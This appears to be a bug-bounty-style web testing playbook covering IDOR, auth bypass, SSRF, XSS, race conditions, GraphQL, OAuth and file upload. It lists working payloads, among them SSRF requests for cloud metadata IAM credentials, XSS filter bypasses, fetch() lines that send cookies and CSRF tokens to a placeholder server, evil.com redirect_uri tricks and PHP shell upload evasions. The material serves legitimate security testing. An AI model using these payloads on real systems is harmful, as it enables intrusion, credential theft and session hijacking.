# Vulnerability Classes — Testing Playbook

## IDOR (Insecure Direct Object Reference)

**Setup**: Two accounts (attacker + victim). Log in as both.

**Test pattern**:
1. Perform action as victim → note all IDs in requests
2. Replay same request with attacker's token + victim's IDs
3. If data returned → IDOR confirmed

**Expand**:
- Test GET, PUT, DELETE on same endpoint
- Test ALL sibling endpoints (export, share, archive, download, history)
- Test /api/v1/ if /api/v2/ is protected (version downgrade)
- Test without auth header entirely
- Test numeric ID +1, -1, 0
- Test GraphQL `node(id: "base64")` queries

**Kill signals**: All endpoints return 403 with wrong ID, UUIDs without enumeration path.

## Auth Bypass

**Test pattern**:
1. Identify protected endpoint
2. Remove Authorization header → still works?
3. Try method override: `X-HTTP-Method-Override: GET` on POST
4. Try path traversal: `/api/admin/./users`, `/api/v2/../v1/admin/`
5. Try case variation: `/Api/Admin/Users`
6. Try HTTP method change: if GET is blocked, try POST/PUT/OPTIONS

**Sibling check**: If one endpoint in a controller has auth bypass, test ALL siblings.

## SSRF (Server-Side Request Forgery)

**Find injection points**: URL parameters, webhook URLs, file import, image fetch, PDF generation.

**Test sequence**:
1. OOB first: `https://YOUR_OOB_SERVER` → confirm DNS callback
2. If callback → try internal: `http://169.254.169.254/latest/meta-data/`
3. If cloud metadata → get IAM creds: `.../iam/security-credentials/ROLE_NAME`
4. Try internal services: `http://localhost:8080`, `http://10.0.0.1`

**Bypass filters**:
```
http://127.0.0.1 → http://0x7f000001 → http://2130706433 → http://017700000001
http://169.254.169.254 → http://[::ffff:169.254.169.254]
DNS rebinding: register domain that resolves to 169.254.169.254
Open redirect chain: https://target.com/redirect?to=http://169.254.169.254
```

## XSS (Cross-Site Scripting)

**Context matters more than payload**:
- HTML body: `<img src=x onerror=alert(1)>`
- Attribute: `" onfocus="alert(1)" autofocus="`
- JS string: `';alert(1)//`
- Template: `{{constructor.constructor('alert(1)')()}}`

**Impact proof** (alert is NOT enough):
```javascript
fetch('https://server/?c='+document.cookie)  // cookie theft
new Image().src='https://server/?t='+document.querySelector('[name=csrf]').value  // CSRF token
```

**WAF bypass quick list**:
```
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```

## Race Conditions

**High-value targets**: Coupon application, balance transfer, vote counting, rate limits, account creation bonuses.

**Test**: Send 20+ identical requests in parallel:
```bash
seq 1 20 | xargs -P 20 -I {} curl -s "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" -d '{"code":"DISCOUNT50"}'
```
If coupon applied multiple times → race confirmed.

## GraphQL

**Recon**: Check `/graphql`, `/api/graphql`, `/graphql/v1`.

**Introspection** (informational alone — need auth bypass to report):
```json
{"query":"{ __schema { types { name fields { name } } } }"}
```

**Real bugs**: Auth bypass on mutations (test without auth), IDOR via `node(id)`, batch queries bypassing rate limits, nested query DoS.

## OAuth / OIDC

**Check**: redirect_uri manipulation, PKCE enforcement, state parameter, code reuse.

**redirect_uri bypass attempts**:
```
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com/callback/../redirect?to=evil.com
redirect_uri=https://target.com/callback%23@evil.com
```

## Business Logic

**Can't automate — requires understanding the application**:
- Price manipulation (negative quantities, decimal abuse)
- Workflow bypass (skip steps in multi-step process)
- Privilege confusion (user A's action affects user B)
- Feature abuse (use intended feature in unintended way)
- Quota bypass (circumvent rate/usage limits)

## File Upload

**Extension bypass**:
```
shell.php → shell.php.jpg → shell.pHp → shell.php%00.jpg → shell.php;.jpg
```

**Content-type bypass**: Set image/png but upload PHP/HTML content.

**Magic bytes**: Prepend `GIF89a` to PHP file.

**SVG XSS**: `<svg onload="alert(1)">` in SVG upload.
